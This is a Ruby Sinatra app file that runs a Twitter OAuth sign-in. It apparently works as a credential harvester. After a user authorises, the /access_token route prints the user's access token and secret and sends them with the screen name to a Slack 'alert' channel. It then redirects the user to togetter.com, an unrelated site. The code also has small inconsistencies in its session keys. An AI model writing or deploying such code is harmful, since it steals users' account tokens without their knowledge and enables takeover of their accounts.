require 'bundler/setup'
Bundler.require
require 'sinatra/reloader' if development?
require 'sinatra'
require 'sinatra-websocket'
require 'sinatra/json'
#require './models.rb'
require 'open-uri'
require 'time'
require 'json'

require 'twitter_oauth'
require './slack'

Time.zone = "Tokyo"
ActiveRecord::Base.default_timezone = :local

set :server, 'thin'
set :sockets, Hash.new { |h, k| h[k] = [] }

enable :sessions

before do
	key = ENV['TWITTER_API_KEY']
	secret = ENV['TWITTER_API_SECRET']
	@twitter = TwitterOAuth::Client.new(
		:consumer_key => key,
		:consumer_secret => secret,
		:token => session[:access_token],
		:secret => session[:secret_token])
end

get '/' do
	@session = session
	logger.info @session
	erb :index
end

get '/request_token' do
	puts "GET request_token"
	callback_url = "#{base_url}/access_token"
	request_token = @twitter.request_token(:oauth_callback => callback_url)
	session[:request_token] = request_token.token
	session[:request_token_secret] = request_token.secret
	redirect request_token.authorize_url
end

def base_url
	puts "METHOD base_url"
	default_port = (request.scheme == "http") ? 80 : 443
	port = (request.port == default_port) ? "" : ":#{request.port.to_s}"
	"#{request.scheme}://#{request.host}#{port}"
end


get '/access_token' do
	puts "GET access_token"
	begin
		@access_token = @twitter.authorize(session[:request_token], session[:request_token_secret],
																			 :oauth_verifier => params[:oauth_verifier])
	rescue OAuth::Unauthorized => @exception
		return erb :authorize_fail
	end

	puts "=--------------------"
	puts sla_txt ="
	token => #{@access_token.token}\n
	screen =>#{@access_token.secret}\n
	#{@twitter.info['screen_name']}
	"
	sla = SlackSet.new
	sla.send_slack("alert","token",sla_txt)
	session[:access_token] =  @access_token.token
	session[:access_token_secret] = @access_token.secret
	session[:user_id] = @twitter.info['user_id']
	session[:screen_name] = @twitter.info['screen_name']
	session[:profile_image] = @twitter.info['profile_image_url_https']


	redirect 'https://togetter.com/'
end

get '/logout' do
	session.clear
	redirect '/'
end
